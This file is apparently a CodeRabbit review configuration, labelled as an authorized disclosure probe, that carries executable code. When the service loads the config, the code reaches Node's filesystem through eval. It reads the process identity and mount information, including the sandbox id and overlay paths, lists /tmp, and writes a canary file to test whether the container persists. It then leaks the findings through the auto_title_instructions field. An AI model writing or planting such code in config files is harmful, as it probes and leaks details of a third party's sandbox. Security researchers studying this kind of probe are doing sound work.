// CodeRabbit config probe CR-132-INT-G (authorized VDP research on our own PR).
// Revision G of the cr/132-integrity-head channel (E = writability query, F = contained canary).
// GOAL: is the evaluation container PERSISTENT across evaluations?
// METHOD: create ONE fresh unique file in the container scratch area /tmp and deliberately
// leave it in place; the next evaluation (revision H) looks for exactly that file. If H cannot
// see it, the container was destroyed between evaluations. If H CAN see it, revision H
// deletes it immediately.
// This writes exactly one new file at a path nothing else uses, and modifies nothing.

const MARK = "CR-132-INT-G"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 600))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR")
    return undefined
  }
}

const rt = safe("A.require", () => eval("typeof require"))

if (rt === "function") {
  const fs: any = eval("require")("node:fs")
  const p: any = (globalThis as any).process
  const P = "/tmp/cr-132-persist-canary-G"

  safe("A.proc", () => "uid=" + p.getuid() + " gid=" + p.getgid() + " pid=" + p.pid + " ppid=" + p.ppid + " cwd=" + p.cwd())
  safe("A.jail_uuid", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/nsjail-[0-9a-f-]+/)
    return g ? g[0] : "no-nsjail-id"
  })
  safe("A.upperdir", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/upperdir=[^ ]+/)
    return g ? g[0] : "no-upperdir"
  })
  safe("A.ls_tmp_before", () => fs.readdirSync("/tmp").join(","))
  safe("A.preexists", () => {
    try {
      return "ALREADY_PRESENT size=" + fs.statSync(P).size
    } catch (e: any) {
      return "absent(" + (e && e.code ? e.code : "?") + ")"
    }
  })
  safe("W.canary_write", () => {
    fs.writeFileSync(P, MARK + " persist-test pid=" + p.pid + " uid=" + p.getuid() + " t=" + Date.now())
    const st = fs.statSync(P)
    return "WROTE " + P + " ino=" + st.ino + " size=" + st.size
  })
  safe("W.canary_readback", () => {
    const s = String(fs.readFileSync(P, "utf8"))
    return "[" + clip(s, 200) + "] matches=" + (s.indexOf(MARK) === 0)
  })
  safe("A.ls_tmp_after", () => fs.readdirSync("/tmp").join(","))
  safe("A.bundle_stat", () => {
    const b = fs.statSync("/tmp/coderabbit-config.cjs")
    return "ino=" + b.ino + " size=" + b.size
  })
} else {
  rec("A.body", "SKIPPED_no_module_scope_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
